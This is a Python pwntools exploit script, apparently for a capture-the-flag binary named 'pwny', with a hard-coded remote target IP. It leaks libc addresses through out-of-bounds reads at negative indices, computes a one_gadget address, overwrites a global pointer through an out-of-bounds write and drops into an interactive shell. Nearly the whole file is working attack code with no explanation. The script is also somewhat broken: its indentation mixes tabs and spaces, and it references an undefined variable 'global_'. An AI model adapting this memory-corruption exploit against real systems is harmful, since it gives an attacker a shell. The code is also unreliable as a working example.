#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
debug = 1
context(arch='amd64', endian='el', os='linux')
context.log_level = 'debug'
libc_one = [0x4f3d5, 0x4f432, 0xe5617, 0xe561e, 0xe5622, 0x10a41c, 0x10a428]
'''
pwndbg> distance 0x7f7681d6bf68 0x7f7681750000
0x7f7681d6bf68->0x7f7681750000 is -0x61bf68 bytes (-0xc37ed words)
pwndbg> distance 0x55b855ac7060 0x7f7681750000
0x55b855ac7060->0x7f7681750000 is 0x29be2bc88fa0 bytes (0x537c57911f4 words)
'''
def read_0(index):
    p.sendlineafter("choice: ",str(1))
    p.sendafter("Index: ",str(index))

def write_0(index,content):
    p.sendlineafter("Your choice: ",str(2))
    p.sendafter("Index: ",str(index))
    p.send(content)
while True:
    try:
	debug = 1
	if debug == 1:
   		p = process("./pwny")
   		libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	else:
    		p = remote('124.71.231.29',20838)
    		libc = ELF("./libc-2.27.so",checksec=False)
        p.sendlineafter('choice: ','2')
        p.sendlineafter('Index: ',str(0x100)) # over random 
        read_0(p64(0xfffffffffffffff8))
        p.recvuntil("Result: ")
        stdout = p.recvline()[:-1]
        if stdout == '0':
            raise EOFError
        libc.address = int(stdout,16) - libc.sym["_IO_2_1_stdout_"]
        og = libc_one[1] + libc.address
        global0 = libc.address + 0x61bf68
        payload = p64(0xfffffffffffffff5)
        read_0(payload)
	p.recvuntil("Result: ")
        addr_bss = int(p.recvline()[:-1], 16) + 0x58
	success("libc.address = " + hex(libc.address))
        success("one = " + hex(og))
        success("addr_bss = " + hex(addr_bss))
        success("global0 = " + hex(global0))
            
        
        index = (global_ - addr_bss)/8
        write_0(str(index),og)
        p.sendline(str(3))

        p.interactive()
        p.close()
    except EOFError:
        p.close()
            


